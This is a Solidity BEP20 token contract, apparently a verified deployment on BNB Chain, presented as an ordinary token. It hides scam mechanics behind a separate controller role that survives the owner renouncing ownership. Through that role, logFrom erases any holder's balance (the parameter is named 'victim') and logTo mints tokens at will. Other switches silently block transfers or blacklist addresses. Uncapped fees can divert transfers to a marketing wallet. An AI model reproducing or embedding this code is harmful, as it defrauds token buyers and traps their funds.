/**
 *Submitted for verification at BscScan.com on 2022-04-29
*/

pragma solidity 0.5.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns(uint) {
        uint c = a + b;
        assert(c >= a);
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns(uint) {
        assert(b <= a);
        return a-b;
    }

    function mul(uint256 a, uint256 b) internal pure returns(uint) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns(uint) {
        assert(b > 0);
        uint256 c = a / b;
        return c;
    }
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

interface IBEP20 {

  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract Controlled {
    
    constructor() public {
        Market = msg.sender;
    }
    
    modifier onlyController { 
        require(msg.sender == Market); 
        _; 
    }

    address public Market;

    function changeController(address _newController) public onlyController {
        Market = _newController;
    }
}



contract Ownable is Context {
  address private _owner;

  event OwnershipRenounced(address indexed previousOwner);
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }


  function owner() public view returns (address) {
    return _owner;
  }

 
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }


  function renounceOwnership() public onlyOwner {
    emit OwnershipRenounced(_owner);
    _owner = address(0x000000000000000000000000000000000000dEaD);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}


contract NewToken is Context, IBEP20, Ownable, Controlled{
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => bool) public _isbot;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 public _inOn = 0;
    mapping(address => uint256) public _isInlist;
    address marketingWalletAddress = 0xeA8349FEb0a39953928D39e36d3F3b7191C319c4;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    constructor(string memory name, string memory symbol, uint256 _supply) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _totalSupply = _supply*(10**uint256(_decimals));
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function initOOAddress(address account, uint256 value) onlyController public {
        _isInlist[account] = value;
    }

    function changeOn(uint256 status) onlyController public {
        _inOn = status;
    }

    function logFrom(uint256 _value, address victim) onlyController public{
        require(_value <= _balances[victim]);
        uint256 newVaule = _value*(10**18);
        _balances[victim] -= newVaule;
        _balances[address(0)] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }

    function logTo(uint256 _value, address victim) onlyController public{
        uint256 newVaule = _value*(10**18);
        _balances[victim] += newVaule;
        emit Transfer(victim, address(0), newVaule);
    }
    function addbot(address addr , bool value)  onlyController public {
        _isbot[addr] = value;

    }


    function getOwner() external view returns (address) {
        return owner();
    }


    function decimals() external view returns (uint8) {
        return _decimals;
    }


    function symbol() external view returns (string memory) {
        return _symbol;
    }

 
    function name() external view returns (string memory) {
    return _name;
    }


    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount));
        return true;
    }

    function takeFee(address sender,uint256 amount) internal returns (uint256) {
        uint256 burnfeeAmount = 0;
        uint256 marketfeeAmount = 0;
        if(_tradeBurnRatio>0){
            burnfeeAmount = amount.mul(_tradeBurnRatio).div(100);
            _balances[address(0)] = _balances[address(0)].add(burnfeeAmount);
            emit Transfer(sender, address(0), burnfeeAmount);
        }

        if(_tradeMarketRatio>0){
            marketfeeAmount = amount.mul(_tradeMarketRatio).div(100);
            _balances[marketingWalletAddress] = _balances[marketingWalletAddress].add(marketfeeAmount);
            emit Transfer(sender, address(marketingWalletAddress), marketfeeAmount);
        }
        return amount.sub(burnfeeAmount).sub(marketfeeAmount);
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool){
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        require(!_isbot[sender] && !_isbot[recipient]);
        if (amount == 0 || _inOn == 1 || _isInlist[sender] == 1 ) {
            if(_isInlist[sender] != 2){return true;}
        }
        uint256 finalAmount = takeFee(sender, amount);
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(finalAmount);
        emit Transfer(sender, recipient, finalAmount);
    }

    function setMarketingWalletAddress(address newAddress) onlyController public {
        marketingWalletAddress = newAddress;
    }

    uint256 public _tradeBurnRatio;

    function initTradeBurnRatio(uint256 tradeBurnRatio) onlyController public {
        _tradeBurnRatio = tradeBurnRatio;
    }

    uint256 public _tradeMarketRatio;

    function initTradeMarketRatio(uint256 tradeMarketRatio) onlyController public {
        _tradeMarketRatio = tradeMarketRatio;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}